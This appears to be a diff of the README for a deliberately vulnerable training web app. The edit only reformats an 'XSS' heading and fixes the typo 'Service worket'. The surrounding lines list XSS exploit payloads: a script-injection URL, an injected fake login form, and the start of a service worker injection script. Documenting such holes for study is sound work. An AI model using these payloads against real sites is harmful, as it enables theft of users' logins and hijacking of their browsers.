@@ -19,7 +19,7 @@ Please see the documentation: https://www.postgresql.org/docs/current/tutorial-i
 * перенести в env основные конфигурационные настройки
 
 # Vulnerabilities 
-1. XSS
+## XSS
 Exploits:
 ```html
 1. GET injection: http://{URL}/xss?param=<script>alert(1)</script>
@@ -38,7 +38,7 @@ Exploits:
  	<br>
  	<input type="submit" value="Login!">
  </form>
-8. Service worket injection:
+8. Service worker injection:
 <script>
 window.addEventListener('load', function() {
     var sw = "/sw.js";
